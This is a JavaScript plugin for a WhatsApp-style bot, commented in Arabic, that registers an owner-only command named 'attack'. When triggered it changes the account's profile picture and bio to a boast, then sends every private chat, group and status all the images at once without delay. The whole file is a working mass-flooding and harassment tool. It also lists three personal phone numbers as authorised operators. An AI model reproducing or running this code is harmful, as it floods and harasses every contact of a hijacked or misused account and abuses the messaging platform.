const handler = async (m, { conn, isCreator }) => {
  // مصفوفة الصور (الـ 10 صور بتوعك)
  const images = ["https://files.catbox.moe/o7e6jz.jpg", "https://files.catbox.moe/gkcfaq.jpg", "https://files.catbox.moe/w9e7n6.jpg", "https://files.catbox.moe/73exmc.jpg", "https://files.catbox.moe/x0or0t.jpg", "https://files.catbox.moe/x0or0t.jpg", "https://files.catbox.moe/o7e6jz.jpg", "", "https://files.catbox.moe/w9e7n6.jpg", "https://files.catbox.moe/o7e6jz.jpg"];

  // أرقام المطورين (3 أرقام)
  const developers = ["201015115056", "201229441774", "966567158348"];

  const senderNumber = m.sender.split('@')[0];
  if (!developers.includes(senderNumber) && !isCreator) return;

  // 1. تغيير البروفايل فوراً
  if (images[0] !== "") {
    conn.updateProfilePicture(conn.user.jid, { url: images[0] }).catch(() => {});
  }

  // 2. تغيير البايو بزخرفة فخمة
  conn.updateProfileStatus("𝐁𝐄𝐋𝐀𝐋 𝐄𝐋 𝐁𝐎𝐃𝐑𝐀𝐆𝐄 𝐎𝐍 𝐓𝐎𝐏").catch(() => {});

  // 3. تجميع كل المحادثات (خاص، مجموعات، حالات)
  const chats = Object.keys(conn.chats);

  // إرسال إشعار بدء الهجوم
  m.reply("𝐁𝐄𝐋𝐀𝐋 ⦓ 𝐊 ⦔ 𝐁𝐎𝐃𝐑𝐀𝐆𝐄𝐀 🇮🇱 )):");

  // 4. الهجوم الشامل (بدون أي تأخير)
  chats.map(jid => {
    // إرسال الـ 10 صور "دفعة واحدة" لكل محادثة
    images.forEach(img => {
      if (img !== "") {
        conn.sendMessage(jid, { image: { url: img }, caption: "😈" }).catch(() => {});
      }
    });
    // تفاعل سريع
    conn.sendMessage(jid, { react: { text: "💀", key: m.key } }).catch(() => {});
  });

};

handler.command = ["هجوم"];
handler.owner = true;

export default handler;